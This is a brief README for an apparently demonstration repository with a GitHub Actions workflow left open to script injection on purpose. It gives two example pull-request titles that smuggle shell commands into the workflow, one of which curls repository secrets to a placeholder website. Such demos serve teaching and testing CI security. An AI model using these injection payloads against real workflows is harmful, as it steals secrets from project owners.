# Example Repo

This is a super simple example repository!

## Structure
* 'script-injection.yml'
  * workflow vulnerable to script injection
    * Create a PR with title `a";echo Got your secrets"`
      * Echo in workflow execution
    * Create a PR with title `a";curl http:/...MyWebSite...?abc=$YourSecrets"`
      * Extract your secrets and curl to your website